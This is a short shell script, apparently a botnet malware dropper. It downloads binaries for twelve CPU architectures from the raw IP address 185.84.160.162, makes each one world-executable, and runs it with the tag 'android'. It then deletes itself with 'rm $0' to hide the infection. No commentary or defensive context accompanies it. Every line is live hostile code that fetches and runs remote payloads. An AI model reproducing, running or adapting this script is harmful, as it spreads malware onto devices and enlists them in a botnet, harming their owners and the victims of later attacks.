curl http://185.84.160.162/arm; chmod 777 arm; ./arm android
curl http://185.84.160.162/arm5; chmod 777 arm5; ./arm5 android
curl http://185.84.160.162/arm6; chmod 777 arm6; ./arm6 android
curl http://185.84.160.162/arm7; chmod 777 arm7; ./arm7 android
curl http://185.84.160.162/m68k; chmod 777 m68k; ./m68k android
curl http://185.84.160.162/mips; chmod 777 mips; ./mips android
curl http://185.84.160.162/mpsl; chmod 777 mpsl; ./mpsl android
curl http://185.84.160.162/ppc; chmod 777 ppc; ./ppc android
curl http://185.84.160.162/sh4; chmod 777 sh4; ./sh4 android
curl http://185.84.160.162/spc; chmod 777 spc; ./spc android
curl http://185.84.160.162/x86; chmod 777 x86; ./x86 android
curl http://185.84.160.162/x86_64; chmod 777 x86_64; ./x86_64 android

rm $0
